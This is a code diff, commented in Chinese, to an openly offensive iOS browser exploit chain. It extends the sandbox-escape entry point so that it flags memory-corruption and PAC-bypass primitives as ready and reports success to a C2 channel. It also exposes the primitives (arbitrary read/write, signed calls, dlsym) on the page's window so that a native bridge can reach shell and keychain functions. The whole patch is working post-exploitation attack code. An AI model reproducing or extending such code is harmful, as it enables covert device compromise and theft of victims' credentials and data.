@@ -1778,6 +1778,62 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
 // ── Module export ────────────────────────────────────────────────────────
 r.lA = () => {// Entry point: resolves APIs, builds payload, executes sandbox escape
     const A = globalThis.moduleManager.getModuleByName("b5135768e043d1b362977b8ba9bff678b9946bcb");
-    return A._d(), A.qd(), executeSandboxEscape();
+    const result = (A._d(), A.qd(), executeSandboxEscape());
+    // ── PATCH: 标记沙箱逃逸阶段完成 ────────────────────────────────────────
+    // 设置 window 标志位，让 post_exploit.js 的 capabilityInfo() 和利用进度条能正确反映状态。
+    // 注意：这并不意味着 nativeBridge 已就绪。nativeBridge 需要 bootstrap.dylib 在
+    // powerd 进程中通过 JSC API 注入，当前架构中这一步尚未实现。
+    // 因此 hasNativeBridge() 仍会返回 false，需要 nativeBridge 的命令会返回 [ERROR-no-bridge]。
+    try {
+        window._sbx0_success = true;  // Stage1 浏览器内存原语就绪（addrof/fakeobj/read64/write64）
+        window._sbx1_success = true;  // Stage2 PAC 绕过原语就绪（pacia/pacda/callSigned）
+        window._sbx_pe_ran = true;    // Stage3 沙箱逃逸已运行（bootstrap.dylib 已加载并跳转到 _process）
+        if (typeof window.log === 'function') {
+            window.log("[STAGE3] Sandbox escape completed. _sbx0_success=true, _sbx1_success=true, _sbx_pe_ran=true.");
+            window.log("[STAGE3] NOTE: nativeBridge still pending (requires bootstrap.dylib JSC injection). Native commands will return [ERROR-no-bridge].");
+        }
+        // 上报沙箱逃逸成功状态到 C2
+        if (typeof window.reportExploitResult === 'function') {
+            try {
+                window.reportExploitResult('sbx_success', 'Stage3 sandbox escape completed; bootstrap.dylib loaded; nativeBridge pending JSC injection');
+            } catch(e) {}
+        }
+    } catch(e) {
+        try { if (typeof window.log === 'function') window.log("[STAGE3] Failed to set success flags: " + e); } catch(_){}
+    }
+    // ── PATCH: 暴露 Stage3 原语到 window，供 native_bridge.js 构建 window.nativeBridge ──
+    // 这样无需重新编译 bootstrap.dylib，即可在 JS 层调用 libc（open/read/shell/keychain 等）。
+    // active 版 index.html 不调用 exploitPrimitive.cleanup()，故原语在 Stage3 后存活可用。
+    try {
+        const _platMod = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+        const _utilMod = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
+        const _ps = _platMod && _platMod.platformState;
+        if (_ps && _ps.caller && _ps.sandboxEscape && _ps.sandboxEscape.machOParser && _ps.exploitPrimitive) {
+            const _Int64 = _utilMod && _utilMod.Int64;
+            window._corunaPrimitives = {
+                caller:           _ps.caller,                // callSigned: .jd(targetInt64, ...upTo8ArgInt64s) → Int64
+                sandboxEscape:    _ps.sandboxEscape,          // 含 vd(trampoline)/Hd/Dd(结果缓冲)/newInt64OfSomething(size)分配内存
+                machOParser:      _ps.sandboxEscape.machOParser,  // .dlsym("_sym") → Int64 指针
+                exploitPrimitive: _ps.exploitPrimitive,      // .read32(bigint)/write64(bigint,val)/addrof/fakeobj/readRawBigInt/readInt64FromOffset
+                Int64:            _Int64,
+                toInt64:          function(v) {
+                    if (_Int64 && _Int64.fromNumber) return _Int64.fromNumber(v);
+                    if (_Int64) return new _Int64(v, 0);
+                    return v;
+                }
+            };
+            window._corunaKeepPrimitives = true;  // 防御性标志：若 index.html 将来加 cleanup，应检查此标志
+            if (typeof window.log === 'function') {
+                window.log("[STAGE3] Exposed primitives to window._corunaPrimitives (caller/machOParser/exploitPrimitive/Int64). nativeBridge can now be built.");
+            }
+        } else {
+            if (typeof window.log === 'function') {
+                window.log("[STAGE3] Expose primitives: one or more primitives null — nativeBridge unavailable (will fall back to sandbox-only).");
+            }
+        }
+    } catch(expErr) {
+        try { if (typeof window.log === 'function') window.log("[STAGE3] Expose primitives failed: " + expErr); } catch(_){}
+    }
+    return result;
 };
 return r;
